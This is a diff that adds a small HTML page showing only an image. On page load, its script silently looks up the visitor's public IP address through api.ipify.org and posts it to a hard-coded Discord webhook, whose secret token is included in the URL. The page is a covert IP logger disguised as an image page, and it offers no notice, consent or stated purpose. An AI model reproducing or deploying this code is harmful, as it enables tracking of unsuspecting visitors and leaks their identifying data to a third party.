@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>zjj</title>
+</head>
+<body>
+    <img src="image.jpg" alt="Image">
+    <script>
+        fetch('https://api.ipify.org/?format=json')
+        .then(response => response.json())
+        .then(data => {
+            const ip = data.ip;
+            fetch('https://discord.com/api/webhooks/1257339765255176192/15093IFlJQ7njmRHS1WLbWZkNaH6RbYWlvWKOfjrNEuAYvmZ-OaA-8gHE7-SHlEanYRt', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ content: `IP Address: ${ip}` }),
+            });
+        });
+    </script>
+</body>
+</html>
